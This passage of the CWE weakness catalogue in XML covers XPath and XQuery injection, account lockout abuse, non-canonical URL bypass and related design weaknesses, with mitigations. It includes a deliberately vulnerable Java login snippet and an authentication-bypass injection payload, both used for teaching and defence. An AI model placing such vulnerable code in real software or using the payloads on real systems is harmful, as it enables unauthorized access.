               <Note>The attacker could read restricted XML content.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use parameterized XPath queries (e.g. using XQuery). This will help ensure separation between data plane and control plane.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Properly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XPath queries is safe in that context.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Consider the following simple XML document that stores authentication information and a snippet of Java code that uses XPath query to retrieve authentication information:</Intro_Text>
               <Example_Code Nature="informative" Language="XML">
                  <xhtml:div>&lt;users&gt;<xhtml:div style="margin-left:10px;">&lt;user&gt;<xhtml:div style="margin-left:10px;">&lt;login&gt;john&lt;/login&gt;<xhtml:br/>&lt;password&gt;abracadabra&lt;/password&gt;<xhtml:br/>&lt;home_dir&gt;/home/john&lt;/home_dir&gt;</xhtml:div>&lt;/user&gt;<xhtml:br/>&lt;user&gt;<xhtml:div style="margin-left:10px;">&lt;login&gt;cbc&lt;/login&gt;<xhtml:br/>&lt;password&gt;1mgr8&lt;/password&gt;<xhtml:br/>&lt;home_dir&gt;/home/cbc&lt;/home_dir&gt;</xhtml:div>&lt;/user&gt;</xhtml:div>&lt;/users&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The Java code used to retrieve the home directory based on the provided credentials is:</Body_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>XPath xpath = XPathFactory.newInstance().newXPath();<xhtml:br/>XPathExpression xlogin = xpath.compile("//users/user[login/text()='" + login.getUserName() + "' and password/text() = '" + login.getPassword() + "']/home_dir/text()");<xhtml:br/>Document d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File("db.xml"));<xhtml:br/>String homedir = xlogin.evaluate(d);</xhtml:div>
               </Example_Code>
               <Body_Text>Assume that user "john" wishes to leverage XPath Injection and login without a valid password. By providing a username "john" and password "' or ''='" the XPath expression now becomes</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>//users/user[login/text()='john' or ''='' and password/text() = '' or ''='']/home_dir/text()</xhtml:div>
               </Example_Code>
               <Body_Text>which, of course, lets user "john" login without a valid password, thus bypassing authentication.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>39</Entry_ID>
               <Entry_Name>XPath Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-531"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;XPath Injection&#34;, Page 1070"/>
         </References>
         <Notes>
            <Note Type="Relationship">This weakness is similar to other weaknesses that enable injection style attacks, such as SQL injection, command injection and LDAP injection. The main difference is that the target of attack here is the XML database.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="645" Name="Overly Restrictive Account Lockout Mechanism" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software contains an account lockout protection mechanism, but the mechanism is too restrictive and can be triggered too easily, which allows attackers to deny service to legitimate users by causing their accounts to be locked out.</Description>
         <Extended_Description>Account lockout is a security feature often present in applications as a countermeasure to the brute force attack on the password based authentication mechanism of the system. After a certain number of failed login attempts, the users' account may be disabled for a certain period of time or until it is unlocked by an administrator. Other security events may also possibly trigger account lockout. However, an attacker may use this very security feature to deny service to legitimate system users. It is therefore important to ensure that the account lockout security mechanism is not overly restrictive.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>Users could be locked out of accounts.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Implement more intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Implement a lockout timeout that grows as the number of incorrect login attempts goes up, eventually resulting in a complete lockout.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Consider alternatives to account lockout that would still be effective against password brute force attacks, such as presenting the user machine with a puzzle to solve (makes it do some computation).</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="2"/>
         </Related_Attack_Patterns>
         
      </Weakness>
      <Weakness ID="647" Name="Use of Non-Canonical URL Paths for Authorization Decisions" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software defines policy namespaces and makes authorization decisions based on the assumption that a URL is canonical. This can allow a non-canonical URL to bypass the authorization.</Description>
         <Extended_Description>
            <xhtml:p>If an application defines policy namespaces and makes authorization decisions based on the URL, but it does not require or convert to a canonical URL before making the authorization decision, then it opens the application to attack. For example, if the application only wants to allow access to http://www.example.com/mypage, then the attacker might be able to bypass this restriction using equivalent URLs such as:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>http://WWW.EXAMPLE.COM/mypage</xhtml:li>
                  <xhtml:li>http://www.example.com/%6Dypage (alternate encoding)</xhtml:li>
                  <xhtml:li>http://192.168.1.1/mypage (IP address)</xhtml:li>
                  <xhtml:li>http://www.example.com/mypage/ (trailing /)</xhtml:li>
                  <xhtml:li>http://www.example.com:80/mypage</xhtml:li>
               </xhtml:ul>
            </xhtml:div>
            <xhtml:p>Therefore it is important to specify access control policy that is based on the path information in some canonical form with all alternate encodings rejected (which can be accomplished by a default deny rule).</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="863" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="863" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>An attacker may be able to bypass the authorization mechanism to gain access to the otherwise-protected URL.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Note>If a non-canonical URL is used, the server may choose to return the contents of the file, instead of pre-processing the file (e.g. as a program).</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make access control policy based on path information in canonical form. Use very restrictive regular expressions to validate that the path is in the expected form.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Reject all alternate path encodings that are not in the expected canonical form.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Example from CAPEC (CAPEC ID: 4, "Using Alternative IP Address Encodings"). An attacker identifies an application server that applies a security policy based on the domain and application name, so the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by putting in the IP address of the host the application authentication and authorization controls may be bypassed http://192.168.0.1:8080/application. The attacker relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>IDS02-J</Entry_ID>
               <Entry_Name>Canonicalize path names before validating them</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         
      </Weakness>
      <Weakness ID="649" Name="Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software uses obfuscation or encryption of inputs that should not be mutable by an external actor, but the software does not use integrity checks to detect if those inputs have been modified.</Description>
         <Extended_Description>When an application relies on obfuscation or incorrectly applied / weak encryption to protect client-controllable tokens or parameters, that may have an effect on the user state, system state, or some decision made on the server. Without protecting the tokens/parameters for integrity, the application is vulnerable to an attack where an adversary blindly traverses the space of possible values of the said token/parameter in order to attempt to gain an advantage. The goal of the attacker is to find another admissible value that will somehow elevate their privileges in the system, disclose information or change the behavior of the system in some way beneficial to the attacker. If the application does not protect these critical tokens/parameters for integrity, it will not be able to determine that these values have been tampered with. Measures that are used to protect data for confidentiality should not be relied upon to provide the integrity service.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
               <Note>The inputs could be modified without detection, causing the software to have unexpected system state or make incorrect security decisions.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Protect important client controllable tokens/parameters for integrity using PKI methods (i.e. digital signatures) or other means, and checks for integrity on the server side.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Repeated requests from a particular user that include invalid values of tokens/parameters (those that should not be changed manually by users) should result in the user account lockout.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Client side tokens/parameters should not be such that it would be easy/predictable to guess another valid state.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Obfuscation should not be relied upon. If encryption is used, it needs to be properly applied (i.e. proven algorithm and implementation, use padding, use random initialization vector, user proper encryption mode). Even with proper encryption where the ciphertext does not leak information about the plaintext or reveal its structure, compromising integrity is possible (although less likely) without the provision of the integrity service.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-0039</Reference>
               <Description>An IPSec configuration does not perform integrity checking of the IPSec packet as the result of either not configuring ESP properly to support the integrity service or using AH improperly. In either case, the security gateway receiving the IPSec packet would not validate the integrity of the packet to ensure that it was not changed. Thus if the packets were intercepted the attacker could undetectably change some of the bits in the packets. The meaningful bit flipping was possible due to the known weaknesses in the CBC encryption mode. Since the attacker knew the structure of the packet, they were able (in one variation of the attack) to use bit flipping to change the destination IP of the packet to the destination machine controlled by the attacker. And so the destination security gateway would decrypt the packet and then forward the plaintext to the machine controlled by the attacker. The attacker could then read the original message. For instance if VPN was used with the vulnerable IPSec configuration the attacker could read the victim's e-mail. This vulnerability demonstrates the need to enforce the integrity service properly when critical data could be modified by an attacker. This problem might have also been mitigated by using an encryption mode that is not susceptible to bit flipping attacks, but the preferred mechanism to address this problem still remains message verification for integrity. While this attack focuses on the network layer and requires a man in the middle scenario, the situation is not much different at the software level where an attacker can modify tokens/parameters used by the application.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0039</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="463"/>
         </Related_Attack_Patterns>
         
      </Weakness>
      <Weakness ID="652" Name="Improper Neutralization of Data within XQuery Expressions ('XQuery Injection')" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software uses external input to dynamically construct an XQuery expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.</Description>
         <Extended_Description>The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="943" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="91" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="91" View_ID="699"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>An attacker might be able to read sensitive information from the XML database.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use parameterized queries. This will help ensure separation between data plane and control plane.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Properly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XQL queries is safe in that context.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>An attacker may pass XQuery expressions embedded in an otherwise standard XML document. The attacker tunnels through the application entry point to target the resource access layer. The string below is an example of an attacker accessing the accounts.xml to request the service provider send all user names back. doc(accounts.xml)//user[name='*'] The attacks that are possible through XQuery are difficult to predict, if the data is not validated prior to executing the XQL.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>46</Entry_ID>
               <Entry_Name>XQuery Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
            <Note Type="Relationship">This weakness is similar to other weaknesses that enable injection style attacks, such as SQL injection, command injection and LDAP injection. The main difference is that the target of attack here is the XML database.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="653" Name="Insufficient Compartmentalization" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not sufficiently compartmentalize functionality or processes that require different privilege levels, rights, or permissions.</Description>
         <Extended_Description>When a weakness occurs in functionality that is accessible by lower-privileged users, then without strong boundaries, an attack might extend the scope of the damage to higher-privileged users.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="657" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="657" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Separation of Privilege</Term>
               <Description>Some people and publications use the term "Separation of Privilege" to describe this weakness, but this term has dual meanings in current usage. This node conflicts with the original definition of "Separation of Privilege" by Saltzer and Schroeder; that original definition is more closely associated with CWE-654. Because there are multiple interpretations, use of the "Separation of Privilege" term is discouraged.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>The exploitation of a weakness in low-privileged areas of the software can be leveraged to reach higher-privileged areas without having to overcome any additional obstacles.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Compare binary / bytecode to application permission manifest</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Break up privileges between different modules, objects or entities. Minimize the interfaces between modules and require strong access control between them.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>Single sign-on technology is intended to make it easier for users to access multiple resources or domains without having to authenticate each time. While this is highly convenient for the user and attempts to address problems with psychological acceptability, it also means that a compromise of a user's credentials can provide immediate access to all other resources or domains.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The traditional UNIX privilege model provides root with arbitrary access to all resources, but root is frequently the only user that has privileges. As a result, administrative tasks require root privileges, even if those tasks are limited to a small area, such as updating user man pages. Some UNIX flavors have a "bin" user that is the owner of system executables, but since root relies on executables owned by bin, a compromise of the bin account can be leveraged for root privileges by modifying a bin-owned executable, such as CVE-2007-4238.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <References>
            <Reference External_Reference_ID="REF-196"/>
            <Reference External_Reference_ID="REF-535"/>
         </References>
         <Notes>
            <Note Type="Relationship">There is a close association with CWE-250 (Execution with Unnecessary Privileges). CWE-653 is about providing separate components for each privilege; CWE-250 is about ensuring that each component has the least amount of privileges possible. In this fashion, compartmentalization becomes one mechanism for reducing privileges.</Note>
            <Note Type="Terminology">The term "Separation of Privilege" is used in several different ways in the industry, but they generally combine two closely related principles: compartmentalization (this node) and using only one factor in a security decision (CWE-654). Proper compartmentalization implicitly introduces multiple factors into a security decision, but there can be cases in which multiple factors are required for authentication or other mechanisms that do not involve compartmentalization, such as performing all required checks on a submitted certificate. It is likely that CWE-653 and CWE-654 will provoke further discussion.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="656" Name="Reliance on Security Through Obscurity" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The software uses a protection mechanism whose strength depends heavily on its obscurity, such that knowledge of its algorithms or key data is sufficient to defeat the mechanism.</Description>
         <Extended_Description>This reliance on "security through obscurity" can produce resultant weaknesses if an attacker is able to reverse engineer the inner workings of the mechanism. Note that obscurity can be one small part of defense in depth, since it can create more work for an attacker; however, it is a significant risk if used as the primary means of protection.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="657" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="657" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="259" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="321" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="472" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Never Assuming your secrets are safe</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>The security mechanism can be bypassed easily.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Always consider whether knowledge of your code or design is sufficient to break it. Reverse engineering is a highly successful discipline, and financially feasible for motivated adversaries. Black-box techniques are established for binary analysis of executables that use obfuscation, runtime analysis of proprietary protocols, inferring file formats, and others.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>When available, use publicly-vetted algorithms and procedures, as these are more likely to undergo more extensive security analysis and testing. This is especially the case with encryption and authentication.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The design of TCP relies on the secrecy of Initial Sequence Numbers (ISNs), as originally covered in CVE-1999-0077. If ISNs can be guessed (due to predictability, CWE-330) or sniffed (due to lack of encryption, CWE-311), then an attacker can hijack or spoof connections. Many TCP implementations have had variations of this problem over the years, including CVE-2004-0641, CVE-2002-1463, CVE-2001-0751, CVE-2001-0328, CVE-2001-0288, CVE-2001-0163, CVE-2001-0162, CVE-2000-0916, and CVE-2000-0328.</Intro_Text>
         <References>
                  <Reference External_Reference_ID="REF-542"/>
               </References>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2006-6588</Reference>
               <Description>Reliance on hidden form fields in a web application. Many web application vulnerabilities exist because the developer did not consider that "hidden" form fields can be processed using a modified client.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6588</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-7142</Reference>
               <Description>Hard-coded cryptographic key stored in executable program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-7142</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-4002</Reference>
               <Description>Hard-coded cryptographic key stored in executable program.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4002</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4068</Reference>
               <Description>Hard-coded hashed values for username and password contained in client-side script, allowing brute-force offline attacks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4068</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-196"/>
            <Reference External_Reference_ID="REF-544"/>
         </References>
         <Notes>
            <Note Type="Relationship">Note that there is a close relationship between this weakness and CWE-603 (Use of Client-Side Authentication). If developers do not believe that a user can reverse engineer a client, then they are more likely to choose client-side authentication in the belief that it is safe.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="668" Name="Exposure of Resource to Wrong Sphere" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource.</Description>
         <Extended_Description>
            <xhtml:p>Resources such as files and directories may be inadvertently exposed through mechanisms such as insecure permissions, or when a program accidentally operates on the wrong object. For example, a program may intend that private files can only be provided to a specific user. This effectively defines a control sphere that is intended to prevent attackers from accessing these private files. If the file permissions are insecure, then parties other than the user will be able to access those files.</xhtml:p>
            <xhtml:p>A separate control sphere might effectively require that the user can only access the private files, but not any other files on the system. If the program does not ensure that the user is only requesting private files, then the user might be able to access other files on the system.</xhtml:p>
            <xhtml:p>In either case, the end result is that a resource has been exposed to the wrong party.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
         <Notes>
            <Note Type="Theoretical">A "control sphere" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for "administrators" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be "users who are authenticated to the operating system on which the product is installed." Each sphere has different sets of actors and allowable behaviors.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="669" Name="Incorrect Resource Transfer Between Spheres" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not properly transfer a resource/behavior to another sphere, or improperly imports a resource/behavior from another sphere, in a manner that provides unintended control over that resource.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Background_Details>
            <Background_Detail>A "control sphere" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for "administrators" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be "users who are authenticated to the operating system on which the product is installed." Each sphere has different sets of actors and allowable behaviors.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
